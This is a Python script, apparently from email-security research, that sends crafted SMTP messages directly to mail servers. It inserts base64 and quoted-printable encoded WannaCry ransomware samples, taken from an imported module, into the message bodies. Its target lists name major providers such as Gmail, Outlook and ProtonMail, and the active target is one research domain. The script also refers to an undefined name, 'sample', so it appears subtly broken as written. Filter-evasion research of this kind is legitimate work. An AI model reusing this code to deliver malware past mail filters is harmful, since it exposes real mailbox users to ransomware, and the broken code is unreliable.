import sys
import time

#import simplejson as json
import argparse

import targets
import utils
import small_test as cases
import Wannacry as wanna
import config
from mail_sender import MailSender

# from common.common import *
# test_cases = testcases.test_cases
# from exploits_builder import ExploitsBuilder
config = config.config


# def parser_error(errmsg):
#     banner()
#     print(("Usage: python " + sys.argv[0] + " [Options] use -h for help"))
#     print(("Error: " + errmsg))
#     sys.exit()


# def parse_args():
#     # parse the arguments
#     parser = argparse.ArgumentParser(
#         epilog='\tExample: \r\npython ' + sys.argv[0] + " -m s -id case_a1")
#     parser.error = parser_error
#     parser._optionals.title = "OPTIONS"
#     parser.add_argument(
#         '-m', '--mode', choices=['s', 'c', 'm'], default='s',
#         help="Select mode: 's' (default) means server mode; 'c' means clien mode; 'm' means manually setting fields;")
#     parser.add_argument(
#         '-l', '--list', action='store', default=-1, const=None, nargs='?',
#         help="List all test cases number and short description. `-l case_id' to see details of a specific case.")
#     parser.add_argument(
#         '-id', '--caseid', default=None,
#         help="Select a specific test case to send email. Effective in server and client mode.")
#     parser.add_argument(
#         '-tls', '--starttls', action='store_true', help="Enable STARTTLS command.")
#
#     parser.add_argument(
#         '-helo', '--helo', default=None, help="Set HELO domain manually. Effective in manual mode only.")
#     parser.add_argument(
#         '-mfrom', '--mfrom', default=None, help="Set MAIL FROM address manually. Effective in manual mode only.")
#     parser.add_argument(
#         '-rcptto', '--rcptto', default=None, help="Set RCPT TO address manually. Effective in manual mode only.")
#     parser.add_argument(
#         '-data', '--data', default=None, help="Set raw email in DATA command. Effective in manual mode only.")
#     parser.add_argument(
#         '-ip', '--ip', default=None, help="Set mail server ip manually. Effective in manual mode only.")
#     parser.add_argument(
#         '-port', '--port', default=None, help="Set mail server port manually. Effective in manual mode only.")
#
#     args = parser.parse_args()
#     return args


# def check_configs():
#     if config["case_id"].decode("utf-8") not in test_cases:
#         print("Error: case_id not found in testcases!")
#         return -1
#
#     if config["mode"] == 'c' and "client" not in config["case_id"].decode("utf-8"):
#         print("Error: case_id should start with 'client_' in client mode!")
#         return -1
#     if config["mode"] == 's' and "server" not in config["case_id"].decode("utf-8"):
#         print("Error: case_id should start with 'server_' in server mode!")
#         return -1
#     return 0


# def list_test_cases(case_id):
#     if case_id == None:
#         case_ids = test_cases.keys()
#         print("%s     %s" % ("Case_id", "Description"))
#         print("-------------------------------------")
#         for id in case_ids:
#             print("%s  %s" % (id, test_cases[id].get("description").decode("utf-8")))
#
#         print("\r\nYou can use '-l case_id' options to list details of a specific case.")
#     else:
#         if case_id in test_cases:
#             print("Here is the details of " + case_id + ":")
#             print(json.dumps(test_cases[case_id], indent=4))
#         else:
#             print("Sorry, case_id not found in testcases.")


def main():
    # args = parse_args()
    # config['mode'] = args.mode
    # if args.list != -1:
    #     list_test_cases(args.list)
    #     return 0
    # if args.caseid:
    #     config['case_id'] = args.caseid.encode("utf-8")
    # if check_configs() == -1:
    #     return -1

    print("Start sending emails...")

    source = "vps3"
    case_id = "boundary_test"
    # target_list = sample.target_mailbox.keys()
    #target_list = ["mail_ru"]
    #target_list = ["mail_ru", "protonmail", "netease_mail", "qq_mail", "tutanota.com", "sapo","zoho","inbox"]
    #target_list = ["gmail", "mail_ru", "outlook", "zoho", "inbox", "fastmail", "mail_com", "Coremail",  "protonmail", "netease_mail", "qq_mail", "tutanota.com", "sapo", "sina_mail", "nisl.lol", "naver.com"]
    target_list = ["nisl.lol"]
    for target in target_list:
        print("\033[94mtesting target mailbox: %s ...\n\033[0m" % target)

        mail_server = sample.target_mailbox[target]["mx"]
        mail_server_port = config["mail_server_port"]
        smtp_header_hl = sample.helo_content[source]
        smtp_header_mf = sample.sender[source]
        smtp_header_rt = sample.target_mailbox[target]["receiver"]
        # starttls = args.starttls if args.starttls else config['server_mode']['starttls']

        # exploits_builder = ExploitsBuilder(testcases.test_cases, config)
        # smtp_seqs = exploits_builder.generate_smtp_seqs()

        from_header = b"From: " + smtp_header_mf + b"\r\n"
        #print(smtp_header_rt)
        to_header = b"To: " + smtp_header_rt + b"\r\n"
        date_header = b"Date: " + utils.get_date() + b"\r\n"
        msg_content = from_header + to_header + date_header + cases.test_cases[case_id]["data"]
        print(case_id)
        Msg_Content = msg_content.decode("utf-8")
        print(Msg_Content)
        Msg_Content = Msg_Content.split("<This is b64_wannacry.>")
        #print(Msg_Content)
        Middle_Content = ""
        Len  = len(Msg_Content)
        for i in range(Len-1):
            Middle_Content = Middle_Content + Msg_Content[i]
            Middle_Content += wanna.Type_cases["b64_wannacry"].decode("utf-8")
        Middle_Content += Msg_Content[-1]
        #print(Middle_Content)

        Middle_Content = Middle_Content.split("<This is qp_wannacry.>")
        Len = len(Middle_Content)
        Final_Content = ""
        for i in range(Len - 1):
            Final_Content = Final_Content + Middle_Content[i]
            Final_Content += wanna.Type_cases["qp_wannacry"].decode("utf-8")
        Final_Content += Middle_Content[-1]
        #print(Final_Content)

        msg_content = Final_Content.encode("utf-8")
        mail_sender = MailSender()
        mail_sender.set_param((mail_server, mail_server_port), helo=smtp_header_hl, mail_from=smtp_header_mf,
                              rcpt_to=smtp_header_rt, email_data=msg_content)
        mail_sender.send_email()

        #time.sleep(0.5)
        # print("\""+target+"\",")

    print("Finished.")


if __name__ == '__main__':
    main()
